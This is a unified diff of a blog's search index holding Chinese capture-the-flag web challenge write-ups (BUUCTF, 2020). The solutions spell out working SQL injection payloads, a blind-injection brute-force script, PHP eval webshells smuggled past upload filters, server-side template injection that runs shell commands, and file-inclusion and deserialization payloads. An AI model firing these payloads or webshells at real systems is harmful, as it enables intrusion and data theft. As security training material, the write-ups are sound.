-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(passwoorrd)%20frfromom%20b4bsql%23</span><br></pre></td></tr></table></figure>
-
-<p>flag{04a7a268-baf9-48a5-b7cb-2b8aeebae765}</p>
-<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>脚本解法：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">"http://d97b67d8-5392-40dd-9416-1943726ff03f.node3.buuoj.cn/index.php"</span>;</span><br><span class="line"> </span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">num=<span class="number">0</span>  <span class="comment">#用了来判断是不是flag已经拼完整了</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line"> </span><br><span class="line">		payload = <span class="string">"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)"</span>%(i,j);</span><br><span class="line">		<span class="comment">#print(str((i-1)*96+j-32)+":~"+payload+"~")</span></span><br><span class="line"> </span><br><span class="line">		data = &#123;</span><br><span class="line">			<span class="string">"id"</span>:payload,</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">		r = requests.post(url,data=data)</span><br><span class="line"> </span><br><span class="line">		r.encoding = r.apparent_encoding</span><br><span class="line"> </span><br><span class="line">		<span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			x = chr(j)</span><br><span class="line">			result+=str(x)</span><br><span class="line">			print(result)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">		<span class="keyword">if</span> <span class="string">"&#125;"</span> <span class="keyword">in</span> result:</span><br><span class="line">			print(result)</span><br><span class="line">			num=<span class="number">1</span></span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>可以上传phtml文件，那么做一个phtml文件，将内容编为一句话木马上传：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="keyword">eval</span>($_POST[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>php被过滤，使用JS脚本绕过：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">"php"</span>&gt;<span class="built_in">eval</span>($_POST[<span class="string">'cmd'</span>]);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
-<p>猜测文件上传目录是upload，蚁剑连接：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;upload&#x2F;a.phtml?a&#x3D;system(%27cat%20&#x2F;flag%27);</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>BUUCTF</category>
-      </categories>
-      <tags>
-        <tag>CTF - Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week20200803-20200809</title>
-    <url>/2020/08/06/week20200803-20200809/</url>
-    <content><![CDATA[<h1 id="Week-4-lt-2020-08-03-2020-08-09-gt"><a href="#Week-4-lt-2020-08-03-2020-08-09-gt" class="headerlink" title="Week 4&lt;2020.08.03 - 2020.08.09&gt;"></a>Week 4&lt;2020.08.03 - 2020.08.09&gt;</h1><a id="more"></a>
-
-<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>网页给出提示<strong>Try to find out source file!</strong><br>访问备份文件：/index.php.bak<br>源代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>即：<br>以GET方式传参，key值等于”123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”（字符串）<br>key值要求为数字</p>
-<p>考点：</p>
-<blockquote>
-<p>PHP的弱类型特性，int和string是无法直接比较的，php会将string转换成int然后再进行比较，转换成int比较时只保留数字，第一个字符串之后的所有内容会被截掉</p>
-</blockquote>
-<p>payload: /?key=123</p>
-<p>flag{32bbbcc8-df1b-419c-b0f7-fc8fe3bd9e48}</p>
-<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>查看源代码，/pay.php</p>
-<p>网页源代码注意到：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">	$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>burpsuite拦截：<br><img src="/2020/08/06/week20200803-20200809/image-20200806022344298.png" alt="image-20200806022344298"></p>
-<p>repeater：</p>
-<p><img src="/2020/08/06/week20200803-20200809/image-20200806025631219.png" alt="image-20200806025631219"></p>
-<p>绕过<code>is_numeric()</code>的方法：</p>
-<blockquote>
-<p><strong>php中的is_numeric()漏洞</strong><br>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！</p>
-</blockquote>
-<p><img src="/2020/08/06/week20200803-20200809/image-20200806025600159.png" alt="image-20200806025600159"></p>
-<p>提示 <strong>Flag need your 100000000 money</strong></p>
-<p><img src="/2020/08/06/week20200803-20200809/image-20200806025538945.png" alt="image-20200806025538945"></p>
-<p>注：这里也可以用科学计数法绕过<br><img src="/2020/08/06/week20200803-20200809/image-20200806025510788.png" alt="image-20200806025510788"></p>
-<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>随便上传一个文件</p>
-<p>报错：</p>
-<p><img src="/2020/08/06/week20200803-20200809/image-20200810024847689.png" alt="image-20200810024847689"></p>
-<p>抓包，修改后缀为.phtml，内容是</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'ye'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>上传成功</p>
-<p><img src="/2020/08/06/week20200803-20200809/image-20200810025324304.png" alt="image-20200810025324304"></p>
-<p>蚁剑连接，在根目录下找到flag</p>
-<p><img src="/2020/08/06/week20200803-20200809/image-20200810025309017.png" alt="image-20200810025309017"></p>
-<p>flag{9b3cc74d-daad-4ad2-a788-82c9d0c3ec16}</p>
-<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>网页代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;	</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>payload:<br><a href="http://0c868115-eafc-49ed-8f9c-279c0a0dc9ec.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D" target="_blank" rel="noopener">http://0c868115-eafc-49ed-8f9c-279c0a0dc9ec.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D</a></p>
-<p>flag{77a1ae97-c1ad-44d3-b1e0-99c77f190391}</p>
-<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>利用脚本寻找利用点</p>
-<p>分析脚本（转载<a href="https://blog.csdn.net/a3320315/article/details/102945940）" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/102945940）</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">'开始时间：  '</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  							  		<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r"D:/soft/phpstudy/PHPTutorial/WWW/src/"</span></span><br><span class="line">os.chdir(filePath)											<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>						<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>										<span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span><span class="params">(file)</span>:</span></span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(<span class="string">'trying   '</span>+file+ <span class="string">'     '</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> open(file,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:							<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = list(re.findall(<span class="string">'\$_GET\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">            posts = list(re.findall(<span class="string">'\$_POST\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;														<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;														<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1/src/'</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)		<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()											<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:						<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">'?%s='</span>%a+<span class="string">"echo 'xxxxxx';"</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()							<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">"echo 'xxxxxx';"</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()						<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:							<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">'找到了利用文件： '</span>+file+<span class="string">"  and 找到了利用的参数：%s"</span> %param)</span><br><span class="line">        print(<span class="string">'结束时间：  '</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:													<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
-
-<p>payload<br><code>/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</code></p>
-<p><strong>flag{9b7d075f-096d-42b2-8cf6-69d0fbf34c12}</strong></p>
-<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>考点：</p>
-<h3 id="password-’”-md5-pass-true-”‘"><a href="#password-’”-md5-pass-true-”‘" class="headerlink" title="password=’”.md5($pass,true).”‘"></a>password=’”.md5($pass,true).”‘</h3><blockquote>
-<p>ffifdyop，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是1select * from ‘admin’ where password=’’ or ‘6xxxxx’</p>
-<p>等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数</p>
-</blockquote>
-<h3 id="md5-bypass"><a href="#md5-bypass" class="headerlink" title="md5 bypass"></a>md5 bypass</h3><blockquote>
-<p>md5()或者sha1()之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果$a和$b都是数组则双双返回FALSE, 两个FALSE相等得以绕过</p>
-</blockquote>
-<h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p>一通乱试看到页面注释有<code>&lt;!--ssssssti &amp; a little trick --&gt;</code></p>
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls &#x2F;&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-<p>找到flag位置</p>
-<p>paylaod</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-<p>回显flag</p>
-]]></content>
-      <categories>
-        <category>BUUCTF</category>
-      </categories>
-      <tags>
-        <tag>CTF - Web</tag>
       </tags>
   </entry>
   <entry>
@@ -867,19 +619,106 @@
       </tags>
   </entry>
   <entry>
-    <title>week20200907-20200913</title>
-    <url>/2020/09/10/week20200907-20200913/</url>
-    <content><![CDATA[<h1 id="Week-6-lt-2020-09-07-2020-09-13-gt"><a href="#Week-6-lt-2020-09-07-2020-09-13-gt" class="headerlink" title="Week 6 &lt;2020.09.07 - 2020.09.13&gt;"></a>Week 6 &lt;2020.09.07 - 2020.09.13&gt;</h1><a id="more"></a>
-
-<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>利用.git源码泄露</p>
-<p>源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+    <title>week20200713-20200719</title>
+    <url>/2020/07/23/week20200713-20200719/</url>
+    <content><![CDATA[<h1 id="Week-1-lt-2020-07-13-2020-07-19-gt"><a href="#Week-1-lt-2020-07-13-2020-07-19-gt" class="headerlink" title="Week 1 &lt;2020.07.13 - 2020.07.19&gt;"></a>Week 1 &lt;2020.07.13 - 2020.07.19&gt;</h1><a id="more"></a>
 
 
+<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>打开实例，只有一张图片，右键查看网页代码：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>&lt;!DOCTYPE html&gt;</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td>&lt;html lang=”en”&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;head&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;meta charset=”UTF-8”&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;meta name=”viewport” content=”width=device-width, initial-scale=1.0”&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;meta http-equiv=”X-UA-Compatible” content=”ie=edge”&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;title&gt;Document&lt;/title&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;/head&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;body&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;!–source.php–&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;br&gt;&lt;img src=”<a href="https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg" target="_blank" rel="noopener">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg</a>“ /&gt;&lt;/body&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td>&lt;/html&gt;</td>
+</tr>
+</tbody></table>
+<p>可以获得source.php代码：<br>payload: <a href="http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=source.php" target="_blank" rel="noopener">http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=source.php</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        </span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];  <span class="comment">// $whitelist</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;  <span class="comment">// $page is string</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;  <span class="comment">// $page in whitelist</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(  <span class="comment">// 截取"?"前的字符串</span></span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;  <span class="comment">// $page in whitelist</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(  <span class="comment">// 截取"?"前的字符串</span></span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;  <span class="comment">// $page in whitelist</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;amp;&amp;amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;amp;&amp;amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=&amp;#92;"</span>https:<span class="comment">//i.loli.net/2018/11/01/5bdb0d93dc794.jpg&amp;#92;" /&gt;";</span></span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过 checkFile()  校验则可以包含flag所在文件<br>先访问$whitelist 中的hint.php<br><a href="http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=hint.php" target="_blank" rel="noopener">http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=hint.php</a><br>获得文件名 <img src="http://localhost:9002/file/image/5f17017f657e1fa600390ac1" alt><br>构造payload：<br><a href="http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=source.php?file=source.php%253f../../../../../ffffllllaaaagggg" target="_blank" rel="noopener">http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=source.php?file=source.php%253f../../../../../ffffllllaaaagggg</a></p>
+<p>flag ： flag{82c0aedf-43e8-4745-9f2c-38444a3c2f30}</p>
+<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p><strong>方法一：堆叠注入，重命名</strong></p>
+<p>SQL语句 ： </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;; show databases#</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/23/week20200713-20200719/image-20200726161826216.png" alt="image-20200726161826216"><br>SQL语句 ： </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;; show tables#</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/23/week20200713-20200719/image-20200726161841013.png" alt="image-20200726161841013"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/23/week20200713-20200719/image-20200726161859923.png" alt="image-20200726161859923"><br>此处发现了flag字段，以下重点：<br>重命名：</p>
